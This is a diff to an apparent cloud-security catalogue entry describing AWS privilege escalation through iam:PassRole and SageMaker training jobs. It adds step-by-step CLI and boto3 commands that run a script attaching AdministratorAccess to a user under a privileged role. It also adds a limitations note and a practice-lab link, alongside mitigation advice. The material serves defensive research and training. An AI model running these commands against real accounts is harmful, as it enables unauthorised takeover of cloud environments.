@@ -20,25 +20,33 @@ exploitationSteps:
   awscli:
   - step: 1
     command: |
-      echo '#!/bin/bash
-      aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-      ' > exploit.sh && chmod +x exploit.sh
-    description: Create a malicious training script that escalates privileges
+      echo '#!/usr/bin/env python3
+      import boto3
+      iam = boto3.client("iam")
+      iam.attach_user_policy(
+          UserName="YOUR_USERNAME",
+          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+      )
+      ' > exploit.py
+    description: Create a malicious training script that attaches AdministratorAccess policy to your user
   - step: 2
     command: |
-      aws s3 cp exploit.sh s3://BUCKET_NAME/exploit/exploit.sh
-    description: Upload the malicious script to S3
+      # Package the script as required by SageMaker
+      tar -czf sourcedir.tar.gz exploit.py
+      aws s3 cp sourcedir.tar.gz s3://BUCKET_NAME/sourcedir.tar.gz
+    description: Package and upload the malicious script to S3 (SageMaker requires tar.gz format)
   - step: 3
     command: |
       aws sagemaker create-training-job \
         --training-job-name privesc-training \
         --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
-        --algorithm-specification TrainingImage=IMAGE_URI,TrainingInputMode=File \
-        --input-data-config '[{"ChannelName":"training","DataSource":{"S3DataSource":{"S3DataType":"S3Prefix","S3Uri":"s3://BUCKET_NAME/exploit/"}}}]' \
-        --output-data-config S3OutputPath=s3://BUCKET_NAME/output \
-        --resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=10 \
-        --stopping-condition MaxRuntimeInSeconds=1800
-    description: Create a training job with the privileged role that executes the malicious script
+        --algorithm-specification '{"TrainingImage":"763104351884.dkr.ecr.REGION.amazonaws.com/pytorch-training:2.0.0-cpu-py310","TrainingInputMode":"File"}' \
+        --input-data-config '[{"ChannelName":"training","DataSource":{"S3DataSource":{"S3DataType":"S3Prefix","S3Uri":"s3://BUCKET_NAME","S3DataDistributionType":"FullyReplicated"}}}]' \
+        --output-data-config '{"S3OutputPath":"s3://BUCKET_NAME/output"}' \
+        --resource-config '{"InstanceType":"ml.m5.large","InstanceCount":1,"VolumeSizeInGB":10}' \
+        --stopping-condition '{"MaxRuntimeInSeconds":600}' \
+        --hyper-parameters '{"sagemaker_program":"exploit.py","sagemaker_submit_directory":"s3://BUCKET_NAME/sourcedir.tar.gz"}'
+    description: Create a training job with the privileged role that executes the malicious script via hyperparameters
   - step: 4
     command: aws sagemaker describe-training-job --training-job-name privesc-training
     description: Monitor the training job status and wait for execution
@@ -69,6 +77,10 @@ recommendation: |
   - Monitor and alert on SageMaker training job creation with privileged roles
   - Regularly audit SageMaker training jobs for excessive IAM permissions
   - Regularly audit all IAM roles that trust the SageMaker service and down-scope any roles with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.
+
 discoveredBy:
   name: Spencer Gietzen
   organization: Rhino Security Labs
@@ -106,6 +118,11 @@ learningEnvironments:
     githubLink: https://github.com/BishopFox/iam-vulnerable
     scenario: SageMaker-CreateTrainingJobPassRole
     description: "Deploy Terraform into your own AWS account and practice individual exploitation paths"
+  pathfinder-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinder-labs
+    scenario: "privesc-one-hop/to-admin/iam-passrole+sagemaker-createtrainingjob"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
 permissions:
   required:
   - permission: iam:PassRole
